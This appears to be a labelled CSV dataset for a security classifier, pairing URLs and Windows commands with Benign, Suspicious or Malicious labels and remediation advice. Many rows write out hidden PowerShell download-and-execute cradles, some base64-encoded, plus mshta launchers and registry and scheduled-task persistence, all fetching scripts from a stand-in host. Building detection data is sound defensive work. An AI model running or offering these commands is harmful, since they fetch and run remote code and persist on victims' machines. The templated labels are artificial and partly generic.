Prompt,Label,Explanation,Recommendation
http://www.meleagris.gr/el/home/37-information/55-meleagris-farm?format=pdf,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
powershell -exec bypass -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jZG4tbWFsNjAuc3RlYWx0aGRyb3AubmV0L3N0YWdlLnBzMScp,Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
kik.com/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
http://roval.com/a.htm,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
$x = Get-Content .\script.ps1; IEX $x,Suspicious,"Suspicious use of redirection, registry access, or clipboard manipulation often seen in reconnaissance or stealth execution.","Monitor usage of `IEX`, clipboard, and registry reads within low-trust sessions."
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal0.stealthdrop.net/drop.ps1')"""""")",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
frontburner.dmagazine.com/2011/04/19/brendan-higgins-and-kent-rathbun-go-on-a-man-date/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
lanecleaning.com/,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
"reg add ""HKCU\Software\Microsoft\ClipboardMonitor"" /v Monitor /d ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal33.stealthdrop.net/clip.ps1')"" /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"schtasks /create /tn ""Updater"" /tr ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal43.stealthdrop.net/boot.ps1')"" /sc onlogon /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
Get-Clipboard | Set-Content clipboard_backup.txt,Suspicious,"Suspicious use of redirection, registry access, or clipboard manipulation often seen in reconnaissance or stealth execution.","Monitor usage of `IEX`, clipboard, and registry reads within low-trust sessions."
Get-EventLog -LogName System -Newest 20,Benign,"Benign command related to documentation, backup logging, or help utilities.",No action needed.
"reg add ""HKCU\Software\Microsoft\ClipboardMonitor"" /v Monitor /d ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal3.stealthdrop.net/clip.ps1')"" /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
powershell -exec bypass -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jZG4tbWFsNy5zdGVhbHRoZHJvcC5uZXQvc3RhZ2UucHMxJyk=,Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
echo 'Backup completed' >> backup_status_26.log,Benign,"Benign command related to documentation, backup logging, or help utilities.",No action needed.
mkdir Reports\Q31,Benign,"Benign command related to documentation, backup logging, or help utilities.",No action needed.
kampanyalar-maximum.com,Malicious,Phishing site designed to trick users into submitting sensitive information.,Block the URL and inform users who may have accessed it.
Get-Clipboard | Set-Content clipboard_backup.txt,Suspicious,"Suspicious use of redirection, registry access, or clipboard manipulation often seen in reconnaissance or stealth execution.","Monitor usage of `IEX`, clipboard, and registry reads within low-trust sessions."
sports.yahoo.com/golf/pga/players/Tom+Pernice+Jr/265,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
Get-EventLog -LogName System -Newest 20,Benign,"Benign command related to documentation, backup logging, or help utilities.",No action needed.
"schtasks /create /tn ""Updater"" /tr ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal40.stealthdrop.net/boot.ps1')"" /sc onlogon /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"reg add ""HKCU\Software\Microsoft\ClipboardMonitor"" /v Monitor /d ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal5.stealthdrop.net/clip.ps1')"" /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"reg add ""HKCU\Software\Microsoft\ClipboardMonitor"" /v Monitor /d ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal68.stealthdrop.net/clip.ps1')"" /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
http://guidartes.com/index.php?page=shop.product_details&category_id=144&flypage=flypage_images.tpl&product_id=804&option=com_virtuemart&Itemid=57,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
mkdir Reports\Q23,Benign,"Benign command related to documentation, backup logging, or help utilities.",No action needed.
"schtasks /create /tn ""Updater"" /tr ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal13.stealthdrop.net/boot.ps1')"" /sc onlogon /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"reg add ""HKCU\Software\Microsoft\ClipboardMonitor"" /v Monitor /d ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal52.stealthdrop.net/clip.ps1')"" /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
Get-Clipboard | Set-Content clipboard_backup.txt,Suspicious,"Suspicious use of redirection, registry access, or clipboard manipulation often seen in reconnaissance or stealth execution.","Monitor usage of `IEX`, clipboard, and registry reads within low-trust sessions."
youtube.com/watch?v=eYUW6qulC98,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
mkdir Reports\Q15,Benign,"Benign command related to documentation, backup logging, or help utilities.",No action needed.
help dir,Benign,"Benign command related to documentation, backup logging, or help utilities.",No action needed.
mkdir Reports\Q5,Benign,"Benign command related to documentation, backup logging, or help utilities.",No action needed.
$x = Get-Content .\script.ps1; IEX $x,Suspicious,"Suspicious use of redirection, registry access, or clipboard manipulation often seen in reconnaissance or stealth execution.","Monitor usage of `IEX`, clipboard, and registry reads within low-trust sessions."
powershell -exec bypass -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jZG4tbWFsNDguc3RlYWx0aGRyb3AubmV0L3N0YWdlLnBzMScp,Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
http://www.westlondongmpresources.org.uk/index.php?page=shop.product_details&flypage=flypage.tpl&product_id=387&category_id=40&option=com_virtuemart&Itemid=1,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
"schtasks /create /tn ""Updater"" /tr ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal16.stealthdrop.net/boot.ps1')"" /sc onlogon /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
mkdir Reports\Q8,Benign,"Benign command related to documentation, backup logging, or help utilities.",No action needed.
powershell -exec bypass -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jZG4tbWFsMTIuc3RlYWx0aGRyb3AubmV0L3N0YWdlLnBzMScp,Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
powershell -exec bypass -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jZG4tbWFsMS5zdGVhbHRoZHJvcC5uZXQvc3RhZ2UucHMxJyk=,Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"reg add ""HKCU\Software\Microsoft\ClipboardMonitor"" /v Monitor /d ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal71.stealthdrop.net/clip.ps1')"" /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal21.stealthdrop.net/drop.ps1')"""""")",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal50.stealthdrop.net/drop.ps1')"""""")",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"powershell -w hidden -Command ""[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LVNlcnZpY2U=')) | IEX""",Suspicious,"Suspicious use of redirection, registry access, or clipboard manipulation often seen in reconnaissance or stealth execution.","Monitor usage of `IEX`, clipboard, and registry reads within low-trust sessions."
http://sventedorsthorst.nl/index.php/nieuws?start=35,Malicious,"The website appears to be defaced, likely due to unauthorized access.",Investigate server integrity and check for other signs of compromise.
"schtasks /create /tn ""Updater"" /tr ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal30.stealthdrop.net/boot.ps1')"" /sc onlogon /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
people.forbes.com/profile/christophe-beck/139580,Benign,Legitimate and publicly safe website with no known malicious behavior.,No action required.
powershell -exec bypass -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jZG4tbWFsNTYuc3RlYWx0aGRyb3AubmV0L3N0YWdlLnBzMScp,Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal55.stealthdrop.net/drop.ps1')"""""")",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
powershell -exec bypass -window hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jZG4tbWFsMTkuc3RlYWx0aGRyb3AubmV0L3N0YWdlLnBzMScp,Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"schtasks /create /tn ""Updater"" /tr ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal32.stealthdrop.net/boot.ps1')"" /sc onlogon /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"reg add ""HKCU\Software\Microsoft\ClipboardMonitor"" /v Monitor /d ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal38.stealthdrop.net/clip.ps1')"" /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
"reg add ""HKCU\Software\Microsoft\ClipboardMonitor"" /v Monitor /d ""powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-mal4.stealthdrop.net/clip.ps1')"" /f",Malicious,"Command simulates a real-world threat technique involving clipboard hijack, persistence, or staging.","Inspect registry, scheduled tasks, and clipboard hooks; block unsigned scripts and mshta usage."
